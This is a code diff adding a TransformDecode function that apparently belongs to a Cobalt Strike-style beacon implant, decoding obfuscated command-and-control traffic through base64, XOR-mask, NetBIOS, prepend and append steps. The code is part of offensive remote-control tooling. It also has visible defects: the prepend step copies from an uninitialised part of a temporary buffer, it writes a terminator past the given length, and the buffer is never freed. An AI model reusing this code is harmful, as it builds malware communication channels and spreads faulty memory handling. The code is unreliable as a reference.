@@ -217,6 +217,88 @@ void TransformEncode(TRANSFORM* transform,
 	}
 }
 
+int TransformDecode(char* recover, char* recoverable, int recoverableLength, int maxGet)
+{
+	char* temp = malloc(recoverableLength);
+	if (temp == NULL)
+		return FALSE;
+
+	datap parser;
+	BeaconDataParse(&parser, recover, maxGet);
+
+	int param;
+	unsigned long outlen;
+	for (int step = BeaconDataInt(&parser); step; step = BeaconDataInt(&parser))
+	{
+		switch (step)
+		{
+			case STEP_BASE64:
+			case STEP_BASE64URL:
+				recoverable[recoverableLength] = 0;
+
+				outlen = maxGet;
+				(step == STEP_BASE64 ? base64_decode : base64url_decode)(recoverable, recoverableLength, temp, &outlen);
+				recoverableLength = outlen;
+
+				if (recoverableLength == 0)
+					return FALSE;
+
+				memcpy(recoverable, temp, recoverableLength);
+				break;
+			case STEP_MASK:
+				recoverable[recoverableLength] = 0;
+				recoverableLength = XorUnmask(recoverable, recoverableLength, temp, maxGet);
+
+				if (recoverableLength == 0)
+					return FALSE;
+
+				memcpy(recoverable, temp, recoverableLength);
+				recoverable[recoverableLength] = 0;
+				break;
+			case STEP_NETBIOS:
+			case STEP_NETBIOSU:
+				recoverable[recoverableLength] = 0;
+				recoverableLength = FromNetbios(
+					step == STEP_NETBIOSU ? 'A' : 'a',
+					recoverable, recoverableLength, 
+					temp, maxGet);
+
+				if (recoverableLength == 0)
+					return FALSE;
+
+				memcpy(recoverable, temp, recoverableLength);
+				recoverable[recoverableLength] = 0;
+				break;
+			case STEP_PREPEND:
+				param = BeaconDataInt(&parser);
+
+				if(param > recoverableLength)
+				{
+					LERROR("Prepend parameter %d is greater than recoverable length %d", param, recoverableLength);
+					return FALSE;
+				}
+
+				memcpy(temp, recoverable, param);
+				recoverableLength -= param;
+				memcpy(recoverable, temp + param, recoverableLength);
+				break;
+		case STEP_APPEND:
+				param = BeaconDataInt(&parser);
+
+				recoverableLength -= param;
+				if (recoverableLength <= 0)
+					return FALSE;
+
+				break;
+			default:
+				LERROR("Unknown step %d", step);
+				return FALSE;
+		}
+	}
+
+	return recoverableLength;
+}
+
 void TransformDestroy(TRANSFORM* transform)
 {
 	BeaconDataFree(transform->parser);
